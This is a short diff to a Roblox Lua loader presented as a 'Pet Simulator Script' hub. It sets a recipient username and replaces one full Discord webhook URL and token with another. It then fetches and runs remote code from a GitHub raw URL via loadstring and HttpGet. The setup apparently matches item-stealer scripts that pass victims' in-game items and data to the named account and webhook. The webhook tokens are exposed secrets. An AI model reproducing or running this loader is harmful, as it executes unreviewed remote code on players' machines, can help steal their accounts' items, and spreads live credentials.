@@ -1,5 +1,5 @@
 _G.Username = "GABRIELofficial_GAME"
 _G.HubName = "Pet Simulator Script"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1098645623965765723/Z64xcLW2Mu7nbDJBkFr1DqStup5_1dFJN0dsMmfdQRbLxtBSWZupFSuhASQFVOSqPCEW"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098966912744042497/0Q5XzfkwDKFuaNq3-13aQxWPkVqWM3vjlDQMzR5UZLlGH3wgvAGQ8s74AUJ24mtwca8G"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
